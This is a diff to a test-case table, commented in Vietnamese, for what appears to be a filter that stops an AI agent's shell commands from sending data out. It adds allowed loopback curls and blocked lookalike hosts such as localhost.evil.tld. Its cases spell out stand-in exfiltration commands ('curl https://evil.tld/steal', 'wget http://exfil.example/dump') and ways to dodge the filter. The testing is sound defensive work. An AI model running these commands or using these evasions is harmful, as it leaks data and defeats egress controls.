@@ -44,10 +44,17 @@ CASES = [
      'git commit --no-verify -m "sửa curl để tới example.com"', True),
     ("không có lệnh mạng nào → không soi gì",
      'echo "https://evil.tld/steal"', True),
+    # loopback KHÔNG phải egress (audit 280926 F4: 10/30 lần chặn là curl server dev của
+    # chính agent — R21 còn in link đó ra). Tha trong code, KHÔNG nhét vào allow_domains.
+    ("curl localhost server dev", 'curl -s http://localhost:8765/x.html | grep -c a', True),
+    ("curl 127.0.0.1", 'curl -sI http://127.0.0.1:3000/', True),
+    ("curl *.localhost", 'curl http://app.localhost:5173/', True),
 
     # ── PHẢI CẮN: exfil thật ───────────────────────────────────────────────────
     ("curl tới host NGOÀI allow-list", 'curl https://evil.tld/steal', False),
     ("bare host ngoài allow-list ở đúng segment của curl", 'curl evil.tld/x', False),
+    ("host giả dạng loopback (localhost.evil.tld)", 'curl https://localhost.evil.tld/x', False),
+    ("host giả dạng loopback (127.0.0.1.nip.io)", 'curl http://127.0.0.1.nip.io/x', False),
     ("wget tới host lạ", 'wget http://exfil.example/dump', False),
     ("host lạ đi qua biến trong segment của curl",
      'H=evil.tld; curl "https://$H/x"', False),
